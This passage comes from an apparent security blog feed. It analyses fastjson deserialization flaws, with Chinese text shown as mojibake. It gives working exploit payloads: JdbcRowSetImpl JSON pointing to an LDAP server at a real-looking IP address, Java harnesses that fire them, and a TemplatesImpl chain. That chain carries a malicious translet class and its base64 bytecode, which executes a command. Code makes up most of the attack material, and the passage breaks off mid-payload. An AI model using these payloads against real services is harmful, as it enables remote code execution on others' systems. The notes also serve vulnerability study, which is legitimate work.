alt="image-20240326214238747"></p><p>åœ¨ç»è¿‡äº†å¯¹äºL&amp;;ã€[çš„æ£€æµ‹ä¹‹åï¼Œè¿›å…¥äº†é»‘åå•åˆ¤æ–­ï¼Œä½†ç»†çœ‹æŠ›å‡ºå¼‚å¸¸çš„æ¡ä»¶ï¼ˆä¸‹é¢ä»£ç ï¼‰ï¼Œæ˜¯ç±»åœ¨é»‘åå•é‡Œä¸”ä¸åœ¨ç¼“å­˜ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ç§æ–¹å¼å°±å¯ä»¥è®©æˆ‘ä»¬çš„æ¶æ„ç±»ç»•è¿‡æ£€æµ‹ï¼ŒæˆåŠŸè¿”å›clazz(839è¡Œ)ï¼Œåé¢å°±å’Œä¸Šé¢çš„æ­¥éª¤ä¸€æ ·äº†</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸å¼€å¯AutoTypeåˆ†æ">ä¸å¼€å¯AutoTypeåˆ†æ</h3><p>å’Œä¸Šé¢çš„æ­¥éª¤åŸºæœ¬ç›¸åŒ</p><p>ä¸åŒçš„æ˜¯ç¬¬äºŒæ¬¡ï¼Œç”±äºæˆ‘ä»¬å¹¶æ²¡æœ‰å¼€å¯AutoTypeï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ä¸‹é¢çš„ifè¯­å¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326215352786.png" alt="image-20240326215352786"></p><p>clazzä¸ºnullï¼Œç›´æ¥è¿›å…¥åˆ°ä¸‹é¢çš„ç¬¬ä¸€ä¸ªæ¡†çš„è¯­å¥é‡Œ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326215417529.png" alt="image-20240326215417529"></p><p>å› ä¸ºä¸Šä¸€æ¬¡å·²ç»å°†com.sun.rowset.JdbcRowSetImplåŠ å…¥äº†æˆ‘ä»¬çš„ç¼“å­˜ï¼Œæ‰€ä»¥getClassFromMappingå°±æ‰¾åˆ°äº†è¯¥ç±»å¹¶å°†å…¶èµ‹å€¼ç»™clazzï¼Œå› æ­¤ï¼Œæ¶æ„ç±»ç»•è¿‡äº†åœ¨ä¸‹é¢çš„!this.autoTypeSupportçš„ifæ£€æµ‹ï¼Œç›´æ¥åœ¨ç¬¬äºŒä¸ªä¸ªæ¡†çš„è¯­å¥é‡Œè¿›è¡Œäº†è¿”å›ï¼Œå†åœ¨åé¢çš„parseObjectä¸­è¿›è¡Œäº†loadClassåŠ è½½ï¼Œå®ç°äº†ä¸å¼€å¯AutoTypeçš„ç»•è¿‡</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>FastJson1.2.24</title>
    <link href="https://bowuchuling.github.io/posts/1837oiuj.html"/>
    <id>https://bowuchuling.github.io/posts/1837oiuj.html</id>
    <published>2024-03-28T11:25:12.569Z</published>
    <updated>2024-03-28T11:26:57.690Z</updated>
    
    <content type="html"><![CDATA[<h1>FastJson1.2.24</h1><p>å…ˆæä¸€ä¸‹fastjsonçš„åŠŸèƒ½è¦ç‚¹</p><ul><li><p>ä½¿ç”¨ <code>JSON.parse(jsonString)</code> å’Œ <code>JSON.parseObject(jsonString, Target.class)</code>ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– <code>@type</code> æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚</p></li><li><p>fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter/setter æ–¹æ³•ï¼Œå…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ã€ä¸æ˜¯é™æ€æ–¹æ³•ã€ä»¥ <code>get</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ã€ç»§æ‰¿è‡ª <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>ã€æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼›setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ï¼Œä»¥ <code>set</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€éé™æ€æ–¹æ³•ã€è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»ã€å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> ä¸­ã€‚</p></li><li><p>ä½¿ç”¨ <code>JSON.parseObject(jsonString)</code> å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸setter éƒ½è¢«è°ƒç”¨ã€‚</p></li><li><p>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</p></li><li><p>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get/set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> æ–¹æ³•ï¼Œä¼šå¿½ç•¥ <code>_|-</code> å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªæ€•ä½ çš„å­—æ®µåå« <code>_a_g_e_</code>ï¼Œgetter æ–¹æ³•ä¸º <code>getAge()</code>ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ï¼Œåœ¨ 1.2.36 ç‰ˆæœ¬åŠåç»­ç‰ˆæœ¬è¿˜å¯ä»¥æ”¯æŒåŒæ—¶ä½¿ç”¨ <code>_</code> å’Œ <code>-</code> è¿›è¡Œç»„åˆæ··æ·†ã€‚</p></li><li><p>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚</p></li></ul><h2 id="TemplatesImpl-ååºåˆ—åŒ–">TemplatesImpl ååºåˆ—åŒ–</h2><p>Fastjsonï¼ˆ1.2.2 - 1.2.4ï¼‰åœ¨å¯ç”¨äº†<code>SupportNonPublicField</code>ç‰¹æ€§æ—¶å¯ä»¥åˆ©ç”¨Xalançš„TemplatesImplå®ç°RCE</p><p>Fastjsonä¼šåˆ›å»º<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ç±»å®ä¾‹ï¼Œå¹¶é€šè¿‡jsonä¸­çš„å­—æ®µå»æ˜ å°„<code>TemplatesImpl</code>ç±»ä¸­çš„æˆå‘˜å˜é‡ï¼Œæ¯”å¦‚å°†<code>_bytecodes</code> ç»è¿‡Base64è§£ç åå°†byte[]æ˜ å°„åˆ°<code>TemplatesImpl</code>ç±»çš„<code>_bytecodes</code>ä¸Šï¼Œå…¶ä»–å­—æ®µåŒç†ã€‚ä½†ä»…ä»…æ˜¯å±æ€§æ˜ å°„æ˜¯æ— æ³•è§¦å‘ä¼ å…¥çš„ç±»å®ä¾‹åŒ–çš„ï¼Œè¿˜å¿…é¡»è¦è°ƒç”¨<code>getOutputProperties()</code>æ–¹æ³•æ‰ä¼šè§¦å‘<code>defineClass</code>ï¼ˆä½¿ç”¨ä¼ å…¥çš„æ¶æ„ç±»å­—èŠ‚ç åˆ›å»ºç±»ï¼‰å’Œ<code>newInstance</code>ï¼ˆåˆ›å»ºæ¶æ„ç±»å®ä¾‹ï¼Œä»è€Œè§¦å‘æ¶æ„ç±»æ„é€ æ–¹æ³•ä¸­çš„å‘½ä»¤æ‰§è¡Œä»£ç ï¼‰</p><p>é¦–å…ˆå¯ä»¥åœ¨Templateslmpl#getTransletInstanceä¸­å¾—åˆ°å®ä¾‹åŒ–å‡½æ•°</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318223615243.png" alt="image-20240318223615243"></p><p>å¯ä»¥å‘ç°è¿™æ˜¯å°†_classè¿™ä¸ªæ•°ç»„ä¸­çš„[_transletIndex]è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œæ‰€ä»¥è¿™å°±å¯ä»¥ç¡®å®šäº†æˆ‘ä»¬é“¾å­çš„æœ€ç»ˆåˆ©ç”¨ç‚¹</p><p>é€šè¿‡æŸ¥çœ‹å®ä¾‹æˆ‘ä»¬å¯ä»¥å‘ç°å¦‚ä¸‹å…³ç³»ï¼Œç±»ä¸­çš„ <code>getOutputProperties()</code> æ–¹æ³•è°ƒç”¨ <code>newTransformer()</code> æ–¹æ³•ï¼Œè€Œ <code>newTransformer()</code> åˆè°ƒç”¨äº† <code>getTransletInstance()</code> æ–¹æ³•ã€‚å›¾å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224736921.png" alt="image-20240318224736921"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224746475.png" alt="image-20240318224746475"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224924186.png" alt="image-20240318224924186"></p><p>é‚£ä¹ˆè¿™ä¸ªæ—¶å€™å°±è¦çœ‹getOutputProperties()æ˜¯å¦å¯æ§äº†ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯OutputPropertiesçš„getteræ–¹æ³•ï¼Œç„¶åå°±æ˜¯çœ‹ä¸Šé¢æ‰€æåˆ°çš„classæ•°ç»„æ˜¯å¦å¯æ§ï¼Œè¿™å†³å®šäº†æˆ‘ä»¬æ˜¯å¦å¯ä»¥å®ä¾‹åŒ–æˆ‘ä»¬æ‰€è¦åŠ è½½çš„æ¶æ„ç±»</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318225328005.png" alt="image-20240318225328005"></p><p>å¯ä»¥å‘ç°åœ¨ä¸Šå›¾çš„å‚æ•°å…·æœ‰èµ‹å€¼æ“ä½œï¼Œå…¶ä¸­defineTransletClassesåœ¨getTransletInstanceæ˜¯æœ‰è°ƒç”¨çš„ï¼Œåªè¦_classä¸ºç©ºå°±å¯ä»¥è°ƒç”¨ï¼Œè¯¦è§ä¸‹å›¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318225536452.png" alt="image-20240318225536452"></p><p>åˆ†ædefineTransletClasseså¯ä»¥å¾—åˆ°ï¼Œå¦‚æœ_bytecodesä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œè‡ªå®šä¹‰ç±»çš„è°ƒç”¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319102645958.png" alt="image-20240319102645958"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318231646986.png" alt="image-20240318231646986"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ æ¶æ„ç±»ï¼Œå½¢æˆpayloadäº†</p><p>Shell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.IIOException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Base64Encoder.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Encoder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// æ›¿æ¢ä¸ºä½ çš„å­—èŠ‚ç æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;./out/production/1.2.24/Shell.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(classBytes);</span><br><span class="line">        System.out.println(encoded);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•ä»£ç FastjsonTest1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">byteCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQANgoACAAmCAAnCgAoACkKACgAKgcAKwoABQAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAdMU2hlbGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACsBAApTb3VyY2VGaWxlAQAKU2hlbGwuamF2YQwACQAKAQAEY2FsYwcAMAwAMQAyDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA1AAoBAAVTaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACgANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAcQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAMADAAAABoABgAAAA4AAwAPAAsAEgAOABAADwARABMAEwANAAAAFgACAAMACAAeAB8AAAAPAAQAIAAhAAAAIgAAAAcAAk4HACMEAAEAJAAAAAIAJQ==&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+byteCode+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;Chu0&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºpayload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span 